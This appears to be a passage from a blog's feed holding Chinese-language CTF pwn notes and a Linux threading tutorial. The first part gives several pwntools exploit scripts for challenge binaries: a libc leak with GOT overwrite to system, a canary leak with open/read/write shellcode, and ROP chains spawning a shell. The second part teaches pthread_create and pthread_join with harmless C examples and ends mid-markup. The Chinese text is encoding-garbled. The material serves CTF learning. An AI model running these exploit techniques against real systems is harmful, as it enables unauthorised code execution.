src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250307201728.png" alt="Pasted image 20250307201728"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *filename &#x3D; &#39;.&#x2F;pwn&#39;debug &#x3D; 0if debug:    io &#x3D; remote(&#39;nc1.ctfplus.cn&#39;, 18839)else:    io &#x3D; process(filename)elf &#x3D; ELF(filename)context(arch &#x3D; elf.arch, log_level &#x3D; &#39;debug&#39;, os &#x3D; &#39;linux&#39;)context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]def dbg():    gdb.attach(io)libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)io.sendlineafter(&#39;chioce&gt;:&#39;, &#39;5&#39;)io.sendline(&#39;0x404018&#39;)io.recvuntil(&#39;massege:&#39;)libcbase &#x3D; u64(io.recv(6).ljust(8, b&#39;\0&#39;)) - libc.sym[&#39;puts&#39;]success(&#39;libcbase &#x3D;&gt;&gt; &#39; + hex(libcbase))system &#x3D; libcbase + libc.sym[&#39;system&#39;]printf &#x3D; libcbase + libc.sym[&#39;printf&#39;]def menu(num):     io.sendlineafter(&quot;&lt;Your chioce&gt;:&quot;,str(num).encode())def delete(id):     menu(3)     io.sendlineafter(&quot;Index: &quot;,str(id).encode())def edite(id,payload):     menu(4)     io.sendlineafter(&quot;Index: &quot;,str(id).encode())     io.sendafter(&quot;message:&quot;,payload)def add(name,introduce):    menu(1)     io.sendlineafter(&quot;Your name:&quot;,name)     io.sendafter(&quot;Introduce:&quot;,introduce)edite(-4,p64(0)+p64(printf)+p64(system))  #ä¸€ä¸ªç»“æ„ä½“0x30ï¼Œå†™introå†+0x10add(b&#39;&#x2F;bin&#x2F;sh&#39;,b&#39;a&#39;) delete(0)io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="orzï¼Ÿorwï¼"><a href="#orzï¼Ÿorwï¼" class="headerlink" title="orzï¼Ÿorwï¼"></a>orzï¼Ÿorwï¼</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250308120612.png" alt="Pasted image 20250308120612"><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *filename &#x3D; &#39;.&#x2F;orw&#39;debug &#x3D; 0if debug:    io &#x3D; remote(&#39;nc1.ctfplus.cn&#39;, 18839)else:    io &#x3D; process(filename)elf &#x3D; ELF(filename)context(arch &#x3D; elf.arch, log_level &#x3D; &#39;debug&#39;, os &#x3D; &#39;linux&#39;)context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]def dbg():    gdb.attach(io)io.sendlineafter(&#39;size:&#39;, &#39;3&#39;)io.sendafter(&#39;name:&#39;,(b&#39;1&#39;).ljust(0x11-7,b&#39;a&#39;))size &#x3D; len(&quot;Hello 1aaaaaaaa&quot;) res &#x3D; io.recvline()res &#x3D; io.recvline()print(&quot;res&quot;,res) canary &#x3D; u64(res[size:size+8]) canary -&#x3D;0x61success(&#39;canary &#x3D;&gt;&gt; &#39; + hex(canary))io.sendafter(&#39;id&#39;,b&#39;A&#39; * 4 + p64(canary) + b&#39;A&#39; * 8 + p64(0x4012A7) + asm(shellcraft.open(&#39;.&#x2F;flag&#39;, 0) + shellcraft.read(3, 0x404500, 0x100) + shellcraft.write(1, 0x404500, 0x100)))io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="CISCN"><a href="#CISCN" class="headerlink" title="CISCN"></a>CISCN</h2><h3 id="2023-Shaokao"><a href="#2023-Shaokao" class="headerlink" title="2023 Shaokao"></a>2023 Shaokao</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]p&#x3D;process(&quot;.&#x2F;shaokao&quot;)elf&#x3D;ELF(&#39;.&#x2F;shaokao&#39;)def choose(choice):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(str(choice))def buy():    choose(1)    p.recvuntil(&quot;å¤©æ¶¯\n&quot;)    p.sendline(str(1))    p.recvuntil(&quot;ï¼Ÿ\n&quot;)    p.sendline(str(-10000))buy()choose(3)choose(4)choose(5)payload&#x3D;b&#39;&#x2F;bin&#x2F;sh\x00&#39;+b&#39;a&#39;*0x20+p64(0x40264f)+p64(0x4E60F0)+p64(0x40a67e)+p64(0)+p64(0x4a404b)+p64(0)+p64(0)payload+&#x3D;p64(0x458827)+p64(59)+p64(0x402404)p.sendafter(&quot;èµåï¼š\n&quot;,payload)p.interactive()&#39;&#39;&#39;rdi&#x3D;binshåœ°å€,rsi&#x3D;0,rdx&#x3D;0ï¼Œrax&#x3D;59ï¼Œsyscall0x0000000000458827 : pop rax ; ret0x000000000040264f : pop rdi ; ret0x000000000040a67e : pop rsi ; ret0x00000000004a404b : pop rdx ; pop rbx ; ret0x0000000000402404 : syscallname&#x3D;0x4E60F0&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é’æµ·æ°‘æ—å¤§å­¦"><a href="#é’æµ·æ°‘æ—å¤§å­¦" class="headerlink" title="é’æµ·æ°‘æ—å¤§å­¦"></a>é’æµ·æ°‘æ—å¤§å­¦</h2><h3 id="System"><a href="#System" class="headerlink" title="System"></a>System</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *p&#x3D;process(&#39;.&#x2F;system&#39;)elf&#x3D;ELF(&#39;.&#x2F;system&#39;)context.log_level&#x3D;&#39;debug&#39;#é™æ€ç¼–è¯‘ï¼ŒIDAæŸ¥çœ‹å³å¯open_addr &#x3D; 0x0806D020read_addr &#x3D; 0x0806D090write_addr &#x3D; 0x0806D100bss_addr &#x3D; 0x080EB000put_addr &#x3D; 0x0804F7E0  ret&#x3D;0x080481b2pop1ret&#x3D;0x0804846fpop3ret&#x3D;0x0806336bpop2ret&#x3D;0x0805c508sh&#x3D;0x080BE408mprotect&#x3D;0x0806DBB0#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;orw&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;# payload &#x3D; b&#39;A&#39; * 112# payload +&#x3D; p32(put_addr)# payload +&#x3D; p32(pop1ret)# payload +&#x3D; p32(sh)# payload +&#x3D; p32(read_addr)# payload +&#x3D; p32(pop3ret)# payload +&#x3D; p32(0)# payload +&#x3D; p32(bss_addr)# payload +&#x3D; p32(8)# # open(bss_addr, 0)# payload +&#x3D; p32(open_addr)# payload +&#x3D; p32(pop2ret)# payload +&#x3D; p32(bss_addr)# payload +&#x3D; p32(0)      # # read(fd, bss_addr, 100)# payload +&#x3D; p32(read_addr)# payload +&#x3D; p32(pop3ret)# payload +&#x3D; p32(3)# payload +&#x3D; p32(bss_addr)# payload +&#x3D; p32(100)# # write(1, bss_addr, 100)# payload +&#x3D; p32(write_addr)# payload +&#x3D; p32(ret)# payload +&#x3D; p32(1) # payload +&#x3D; p32(bss_addr)# payload +&#x3D; p32(100)# p.sendline(payload)# p.sendlineafter(b&#39;&#x2F;bin&#x2F;sh&#39;,b&#39;&#x2F;flag\x00&#39;)# p.interactive()#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;mprotect&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;payload &#x3D; b&#39;A&#39; * 112payload +&#x3D; p32(mprotect)payload +&#x3D; p32(pop3ret)payload +&#x3D; p32(bss_addr)payload +&#x3D; p32(0x1000)payload +&#x3D; p32(7)payload +&#x3D; p32(put_addr)payload +&#x3D; p32(pop1ret)payload +&#x3D; p32(sh)payload +&#x3D; p32(read_addr)payload +&#x3D; p32(bss_addr)payload +&#x3D; p32(0)payload +&#x3D; p32(bss_addr)payload +&#x3D; p32(len(asm(shellcraft.sh())))p.sendline(payload)payload2&#x3D;asm(shellcraft.sh())p.sendafter(b&#39;&#x2F;bin&#x2F;sh\n&#39;,payload2)p.interactive()#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web-PWNçŸ¥è¯†</title>
      <link href="/2025/03/11/Web-PWN%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/03/11/Web-PWN%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Linuxç³»ç»Ÿç¼–ç¨‹"><a href="#Linuxç³»ç»Ÿç¼–ç¨‹" class="headerlink" title="Linuxç³»ç»Ÿç¼–ç¨‹"></a><strong>Linuxç³»ç»Ÿç¼–ç¨‹</strong></h1><h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><ul><li>ä½¿ç”¨ <code>man</code> å‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹ <code>Linux</code> æ‰‹å†Œï¼Œ<code>man</code> æ˜¯ <code>manual</code> çš„å‘½ä»¤ç¼©å†™ï¼Œå…¶ä¸­æ–‡æ„æ€å°±æ˜¯<code>æ‰‹å†Œ</code>çš„æ„æ€ã€‚<ul><li>æˆ‘ä»¬è¦æŸ¥çœ‹ä¸€ä¸ª<code>å‘½ä»¤</code>æˆ–<code>å‡½æ•°</code>çš„ä½¿ç”¨æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ <code>man å‘½ä»¤</code>æˆ– <code>man å‡½æ•°</code></li><li>ä¾‹å¦‚ï¼šæˆ‘ä»¬è¦æŸ¥çœ‹ <code>getpid</code> çš„ç”¨æ³•ï¼Œå°±å¯ä»¥æ‰§è¡Œ <code>man getpid</code>ï¼Œå°±å¯ä»¥æŸ¥çœ‹æ‰‹å†Œä¸­ <code>getpid</code> è¿™ä¸ªå‡½æ•°çš„ç”¨æ³•</li></ul></li></ul><h2 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h2><ul><li>åœ¨ <code>OS</code> ä¸­è¿›ç¨‹æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ¦‚å¿µï¼Œä¹‹åèƒ½è®©æˆ‘ä»¬æ›´æ–¹ä¾¿ç†è§£è¿›ç¨‹ï¼Œæˆ‘ä»¬å°±å…ˆä»‹ç»å¦ä¸€ä¸ªå‘½ä»¤ <code>pstree</code>ï¼Œè¿™ä¸ªå‘½ä»¤æˆ‘ä»¬ç”¨æ¥æŸ¥çœ‹æ“ä½œç³»ç»Ÿçš„è¿›ç¨‹æ ‘ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>è¿›ç¨‹æ ‘</code>æ¥è¾…åŠ©ç†è§£æˆ–è€…è°ƒè¯•ä¸€äº›ç¨‹åºã€‚<code>pstree</code> è¿™ä¸ªå‘½ä»¤æœ‰ä¸€äº›ç›¸å…³çš„å‚æ•°ï¼Œæ¥ä¸‹æ¥ä»‹ç»ä¸€äº›å¸¸ç”¨çš„å‚æ•°ã€‚<ul><li><code>-p</code>ï¼šè¾“å‡ºè¿›ç¨‹æ ‘ï¼Œå¹¶ä¸”ä¼šè¾“å‡ºè¿›ç¨‹å·</li><li><code>-a</code>ï¼šæ˜¾ç¤ºè¿›ç¨‹æ ‘ï¼Œå¹¶ä¸”æ˜¾ç¤ºæ¯ä¸ªè¿›ç¨‹å¯¹åº”çš„ç›®å½•æ–‡ä»¶</li></ul></li><li>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ <code>pstree -p</code> å‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹å…·ä½“çš„è¿›ç¨‹æ ‘ï¼š</li></ul><h2 id="fork-å‡½æ•°"><a href="#fork-å‡½æ•°" class="headerlink" title="fork()å‡½æ•°"></a>fork()å‡½æ•°</h2><ul><li>åœ¨ç†è§£ <code>fork</code> å‡½æ•°ä¹‹å‰æˆ‘ä»¬å…ˆéœ€è¦ä»‹ç»ä¸€ä¸‹è¿›ç¨‹ï¼Œåœ¨æ“ä½œç³»ç»Ÿä¸­æˆ‘ä»¬åœ¨è¿è¡Œä¸­çš„ç¨‹åºå°±ç›¸å½“äºä¸€ä¸ª<strong>è¿›ç¨‹</strong>ï¼Œè€Œæ¯ä¸ªè¿›ç¨‹éƒ½ä¼šæœ‰ä¸€ä¸ªè¿›ç¨‹å·ï¼ˆpidï¼‰ï¼Œå¹¶ä¸”è¿›ç¨‹å…·æœ‰æ ‘çŠ¶å…³ç³»ï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œè€Œè¿™ä¸ªæ–°è¿›ç¨‹å°±ç›¸å½“äºæ˜¯è¯¥è¿›ç¨‹çš„ä¸€ä¸ª<strong>å­è¿›ç¨‹</strong>ã€‚</li><li>åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>getpid()</code> è·å–å½“å‰è¿›ç¨‹æ‰€å¯¹åº”çš„è¿›ç¨‹å·ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ <code>getppid()</code> è·å–å½“å‰è¿›ç¨‹æ‰€å¯¹åº”çˆ¶è¿›ç¨‹çš„è¿›ç¨‹å·ã€‚</li></ul><h1 id="çº¿ç¨‹ç›¸å…³"><a href="#çº¿ç¨‹ç›¸å…³" class="headerlink" title="çº¿ç¨‹ç›¸å…³"></a>çº¿ç¨‹ç›¸å…³</h1><h2 id="pthread-create-å‡½æ•°"><a href="#pthread-create-å‡½æ•°" class="headerlink" title="pthread_create () å‡½æ•°"></a>pthread_create () å‡½æ•°</h2><ul><li>ä¼šè¯¦ç»†ä»‹ç» <code>pthread_create</code> å‡½æ•°è¿˜ä¼šè¯¦ç»†ä»‹ç» <code>pthread_join()</code> å‡½æ•°</li><li><code>pthread_create()</code>ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ Linux ç³»ç»Ÿæä¾›çš„ä¸€ä¸ªå‡½æ•°ï¼Œä½œç”¨æ˜¯åœ¨å½“å‰è¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ã€‚æ¥ä¸‹æ¥è¯´æ˜ä¸€ä¸‹è¿™ä¸ªå‡½æ•°æ˜¯å¦‚ä½•ä½¿ç”¨çš„ã€‚<ul><li>é¦–å…ˆè¦ä½¿ç”¨è¿™ä¸ªå‡½æ•°ï¼Œé¦–å…ˆè¦åŒ…å«å¤´æ–‡ä»¶<code>#include&lt;pthread.h&gt;</code>ã€‚</li><li>ä½¿ç”¨ <code>gcc</code> ç¼–è¯‘é“¾æ¥çš„æ—¶å€™è¿˜éœ€è¦ä½¿ç”¨ <code>-pthread</code> å‘½ä»¤æ¥è¿›è¡Œç¼–è¯‘ã€‚</li><li>è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½ï¼šåœ¨æˆ‘ä»¬è°ƒç”¨ <code>pthread_create()</code> å‡½æ•°çš„è¿›ç¨‹ä¸­ï¼Œå°±ä¼šåœ¨è¯¥è¿›ç¨‹ä¸­è°ƒç”¨ä¸€ä¸ªçº¿ç¨‹ã€‚è¿™ä¸ªçº¿ç¨‹ä¼šå¼€å§‹æ‰§è¡Œä¸‹é¢ <code>pthread_create()</code> å‡½æ•°ä¸­ç¬¬ <code>3</code> ä¸ªå‚æ•°ï¼ˆå³å‡½æ•°æŒ‡é’ˆï¼‰æŒ‡å‘çš„å‡½æ•°ã€‚</li><li>æ³¨æ„ï¼š<strong>è¢«æŒ‡å‘çš„å‡½æ•°ä¹Ÿæœ‰è¦æ±‚ï¼Œè¿™ä¸ªå‡½æ•°å‚æ•°è¦æ±‚ä¼ é€’ <code>void *</code>ï¼Œè¿”å›å€¼ä¹Ÿè¦æ±‚æ˜¯ <code>void *</code>ï¼Œä½†æ˜¯è¿™å¹¶ä¸æ„å‘³ç€è¿™ä¸ªå‡½æ•°æ²¡æœ‰ä¼ é€’å‚æ•°ï¼Œå…·ä½“è¯·çœ‹ä¸‹é¢ä¾‹å­</strong>ï¼Œå³æŒ‡å‘ <code>void</code> ç±»å‹çš„æŒ‡é’ˆã€‚è¿™ä¸ªæŒ‡é’ˆæ‰€æŒ‡å‘çš„å‡½æ•°å°±æ˜¯æˆ‘ä»¬çº¿ç¨‹è¦æ‰§è¡Œçš„å†…å®¹ã€‚</li></ul></li><li>ç°åœ¨è¯´æ˜ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„<code>å‚æ•°</code>å’Œ<code>è¿”å›å€¼</code>ï¼š<ul><li><code>pthread_tç±»å‹</code>ï¼šå®é™…ä¸Šè¯¥ç±»å‹å°±æ˜¯ä¸€ä¸ª<code>æ— ç¬¦å·æ•´å‹</code>ï¼Œåªæ˜¯ä½¿ç”¨äº†è¿™ä¸ªè¯­å¥è¿›è¡Œå®šä¹‰ <code>typedef unsigned long int pthread_t;</code></li><li><code>pthread_t *thread</code>ï¼šä¼ å…¥çš„æ˜¯ä¸€ä¸ªæŒ‡å‘<code>çº¿ç¨‹ID</code> çš„æŒ‡é’ˆã€‚è¿™ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰<code>çº¿ç¨‹ID</code>ï¼Œå¹¶ä¸åƒåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹å·æ˜¯ç³»ç»Ÿç»™çš„ã€‚</li><li><code>pthread_attr_t *attr</code>ï¼š<code>pthread_attr_t</code> æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œæ‰€ä»¥ <code>*attr</code> æ˜¯ç»“æ„ä½“ç±»å‹çš„æŒ‡é’ˆï¼Œå…¶æŒ‡å‘çš„æ˜¯ <code>pthread_attr_t</code>ã€‚è¿™ä¸ªç»“æ„ä½“æŒ‡é’ˆï¼Œè¿™ä¸ªå‚æ•°å°±æ˜¯ç”¨æ¥å†³å®šæ–°çº¿ç¨‹çš„å±æ€§ã€‚å¦‚æœè¯¥çº¿ç¨‹æ²¡æœ‰å±æ€§ï¼Œå°±ä½¿ç”¨ <code>NULL</code> ä½œä¸ºå‚æ•°ã€‚</li><li><code>void *(*start_routine)(void *)</code>ï¼š<code>start_routine</code> æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°åœ°å€å°±æ˜¯çº¿ç¨‹è¦æ‰§è¡Œçš„å†…å®¹ã€‚</li><li><code>void *arg</code>ï¼šä¼ é€’ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•°ï¼Œæ²¡æœ‰ä»»ä½•å‚æ•°å°±å¡« <code>NULL</code></li><li>è¿”å›å€¼ï¼šåˆ›å»ºæˆåŠŸå°±ä¼šè¿”å› <code>0</code>ï¼Œåˆ›å»ºå¤±è´¥å°±ä¼šè¿”å›ä¸€ä¸ªç‰¹å®šçš„<code>éé›¶å€¼</code>ã€‚<pre class="line-numbers language-C" data-language="C"><code class="language-C">int pthread_create      (pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine)(void *), void *arg);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="level-1"><a href="#level-1" class="headerlink" title="level_1"></a>level_1</h3></li></ul></li><li>æ¥ä¸‹æ¥ä¸¾ä¸€ä¸ªä¾‹å­ï¼š<ul><li>å°±æ˜¯åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œä½¿å¾—çº¿ç¨‹æ‰§è¡Œ <code>thread_function</code></li><li>ä½†æ˜¯è¿™ä¸ªä»£ç çš„æ‰§è¡Œç»“æœä¸ç¬¦åˆæˆ‘ä»¬çš„é¢„æœŸï¼ŒåŸå› æ˜¯è¿›ç¨‹åˆ›å»ºå®Œçº¿ç¨‹å°±ç»“æŸäº†ï¼Œè¿›ç¨‹ç»“æŸä¼šå¯¼è‡´çº¿ç¨‹ä¹Ÿè¢«ç»ˆæ­¢ï¼Œçº¿ç¨‹æ˜¯ä¾èµ–äºè¿›ç¨‹çš„ï¼Œå…¶èµ„æºå±äºè¿›ç¨‹</li><li>æ‰€ä»¥è¿™æ—¶æˆ‘ä»¬éœ€è¦åœ¨åˆ›å»ºå®Œçº¿ç¨‹åï¼Œè®©è¿›ç¨‹æ‰§è¡Œ <code>while</code> å¾ªç¯ï¼Œä»¥ç¡®ä¿è¿›ç¨‹ä¸ç»“æŸï¼Œ<strong>è¿™æ ·å°±å¾—åˆ°äº†é¢„æœŸç»“æœ</strong><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F; gcc 6_thread,c -pthread  #include&lt;pthread.h&gt;  #include&lt;stdio.h&gt;  #include&lt;unistd.h&gt;  #include&lt;stdlib.h&gt;    void *thread_function(void *arg);    int main(void)  &#123;          pthread_t pthread;          int ret;          ret &#x3D; pthread_create(&amp;pthread, NULL, thread_function, NULL);          if (ret !&#x3D; 0)          &#123;                  perror(&quot;pthread_create&quot;);                  exit(1);          &#125;          while(1); &#x2F;&#x2F; ä¹‹åæ·»åŠ çš„          return 0;  &#125;      void *thread_function(void *arg)  &#123;          printf(&quot;Thread begins running\n&quot;);            while(1)          &#123;                  printf(&quot;Hello world\n&quot;);                  sleep(1);          &#125;          return NULL;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level-2"><a href="#level-2" class="headerlink" title="level_2"></a>level_2</h3></li></ul></li><li>ä½†æ˜¯è¿™ä¸ªä»£ç è¿˜æ˜¯æœ‰é—®é¢˜ï¼Œå› ä¸ºçº¿ç¨‹è¿›å…¥æ­»å¾ªç¯äº†ï¼Œç°åœ¨æˆ‘ä»¬ç»§ç»­ä¿®æ”¹è¿™ä¸ªä»£ç ï¼Œä½¿å¾—çº¿ç¨‹æœ‰é™æ¬¡å¾ªç¯ã€‚</li><li>ä½†æ˜¯è¿˜ä¼šå‡ºç°é—®é¢˜ï¼Œè¿™ä¸ªçº¿ç¨‹ç»“æŸåè¿›ç¨‹è¿˜ä¼šåœ¨ç­‰å¾…ä¸­ï¼Œè¿™æ ·ç¨‹åºä¸€ç›´ä¸ä¼šç»“æŸ<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F; gcc 6_thread,c -pthread  #include&lt;pthread.h&gt;  #include&lt;stdio.h&gt;  #include&lt;unistd.h&gt;  #include&lt;stdlib.h&gt;    void *thread_function(void *arg);    int main(void)  &#123;          pthread_t pthread;          int ret;          ret &#x3D; pthread_create(&amp;pthread, NULL, thread_function, NULL);          if (ret !&#x3D; 0)          &#123;                  perror(&quot;pthread_create&quot;);                  exit(1);          &#125;          while(1); &#x2F;&#x2F; ä¹‹åæ·»åŠ çš„          return 0;  &#125;      void *thread_function(void *arg)  &#123;      int i;          printf(&quot;Thread begins running\n&quot;);            for(i&#x3D;0; i &lt; 10 ; i++)          &#123;                  printf(&quot;Hello world\n&quot;);                  sleep(1);          &#125;          return NULL;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level-3"><a href="#level-3" class="headerlink" title="level_3"></a>level_3</h3></li><li>æ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­æ”¹è¿›è¯¥ç¨‹åºï¼Œä½¿å¾—è¿›ç¨‹èƒ½å¤Ÿæ¥å—åˆ°çº¿ç¨‹ç»“æŸã€‚è¿™ä¸ªæ—¶å€™éœ€è¦ä½¿ç”¨åˆ° <code>pthread_join()</code> è¿™ä¸ªå‡½æ•°ã€‚<ul><li>è¿™ä¸ªå‡½æ•°å°±æ˜¯ç­‰å¾…æˆ‘ä»¬åˆ›å»ºçš„çº¿ç¨‹ç»“æŸã€‚çº¿ç¨‹ç»“æŸï¼Œè¿™ä¸ªå‡½æ•°å°†ç«‹åˆ»è¿”å›ï¼›çº¿ç¨‹æ²¡ç»“æŸï¼Œè¿™ä¸ªå‡½æ•°å°†é˜»å¡è¿›ç¨‹ã€‚</li><li>è¿™ä¸ªå‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°å’Œ <code>int</code> ç±»å‹çš„è¿”å›å€¼ <code>int pthread_join(pthread_t thread, void **retval);</code><ul><li><code>pthread_t thread</code>ï¼š<code>çº¿ç¨‹ID</code>ï¼Œ<code>pthread_join</code> è¦ç­‰å¾…ä»€ä¹ˆçº¿ç¨‹ç»“æŸ</li><li><code>void **retval</code>ï¼š<code>ç»“æŸçŠ¶æ€</code>ï¼Œå¦‚æœè¿™ä¸ªæŒ‡é’ˆä¸æ˜¯ç©ºæŒ‡é’ˆï¼Œå°†ä¿å­˜ç›®æ ‡çº¿ç¨‹çš„é€€å‡ºçŠ¶æ€ï¼Œå¦‚æœä¸æƒ³ä¿å­˜å°±ä½¿ç”¨ <code>NULL</code></li><li><code>è¿”å›å€¼</code>ï¼šè°ƒç”¨æˆåŠŸè¿”å› <code>0</code><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F; gcc 6_thread,c -pthread  #include&lt;pthread.h&gt;  #include&lt;stdio.h&gt;  #include&lt;unistd.h&gt;  #include&lt;stdlib.h&gt;    void *thread_function(void *arg);    int main(void)  &#123;          pthread_t pthread;          int ret;          ret &#x3D; pthread_create(&amp;pthread, NULL, thread_function, NULL);          if (ret !&#x3D; 0)          &#123;                  perror(&quot;pthread_create&quot;);                  exit(1);          &#125;          pthread_join(pthread,NULL);          printf(&quot;Thre thread is over,process is over too.\n&quot;);          return 0;  &#125;      void *thread_function(void *arg)  &#123;          int i;          printf(&quot;Thread begins running\n&quot;);            for(i &#x3D; 0;i &lt; 10; i++)          &#123;                  printf(&quot;Hello world\n&quot;);                  sleep(1);          &#125;          return NULL;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level-4"><a href="#level-4" class="headerlink" 